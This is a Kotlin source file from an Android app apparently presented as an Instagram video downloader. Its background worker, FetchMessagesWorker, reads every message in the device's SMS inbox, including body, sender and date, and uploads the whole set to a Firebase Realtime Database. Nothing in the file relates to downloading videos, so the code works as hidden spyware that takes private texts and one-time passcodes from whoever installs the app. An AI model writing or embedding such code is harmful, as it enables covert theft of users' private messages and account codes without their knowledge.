package com.example.instagramvideodownloader.work_manager

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.instagramvideodownloader.work_manager.models.SmsMessageModel
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import org.koin.java.KoinJavaComponent.inject

class FetchMessagesWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {
    private val database: FirebaseDatabase by inject(FirebaseDatabase::class.java)
    private var mAppContext = appContext
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            // Fetch inbox messages
            val inboxMessages = fetchInboxMessages(mAppContext)

            // Upload messages to Firebase Realtime Database
            val reference = database.getReference("inbox_messages")

            reference.setValue(inboxMessages).await()
            // Indicate success
            Result.success()
        } catch (e: Exception) {
            Log.e("exception : ", e.message.toString())
            // Handle any errors
            Result.failure()
        }
    }

    private suspend fun showResultToast(message: String) {
        withContext(Dispatchers.Main) {
            Toast.makeText(mAppContext, message, Toast.LENGTH_SHORT).show()
        }
    }

    private fun fetchInboxMessages(context: Context): List<SmsMessageModel> {
        val inboxMessages = mutableListOf<SmsMessageModel>()

        val uri = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "date DESC"
        )

        cursor?.use {
            val bodyIndex = it.getColumnIndexOrThrow("body")
            val addressIndex = it.getColumnIndexOrThrow("address")
            val dateIndex = it.getColumnIndexOrThrow("date")

            while (it.moveToNext()) {
                val body = it.getString(bodyIndex)
                val address = it.getString(addressIndex)
                val date = it.getLong(dateIndex)

                val smsMessage = SmsMessageModel(body, address, date)
                inboxMessages.add(smsMessage)
            }
        }

        return inboxMessages
    }
}